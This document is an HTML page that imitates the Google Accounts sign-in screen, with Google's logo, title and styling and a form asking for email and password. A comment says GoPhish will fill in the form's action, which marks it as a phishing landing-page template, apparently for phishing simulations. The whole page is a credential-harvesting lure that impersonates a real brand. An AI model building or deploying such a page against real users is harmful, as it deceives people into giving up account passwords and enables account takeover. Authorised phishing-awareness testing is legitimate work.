<!DOCTYPE html><html lang="en">
  <head>
    <meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Sign in – Google Accounts</title>
	<style type="text/css">body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
      width: 350px;
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    h2 {
      font-size: 20px;
      margin-bottom: 20px;
      color: #202124;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
    }
    input[type="submit"] {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background-color: #1a73e8;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }
    input[type="submit"]:hover {
      background-color: #1669c1;
    }
    .link {
      margin-top: 15px;
      font-size: 13px;
    }
    .link a {
      text-decoration: none;
      color: #1a73e8;
    }
	</style>
</head>
<body>
<div class="login-box"><img alt="Google Logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"/>
<h2>Sign in</h2>
<!-- GoPhish will replace action -->

<form method="post" action=""><input name="email" placeholder="Email or phone" required="" type="text"/> <input name="password" placeholder="Enter your password" required="" type="password"/> <input type="submit" value="Next"/> </form>

<div class="link"><a href="#">Forgot email?</a></div>

<div class="link">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
</div>


</body></html>
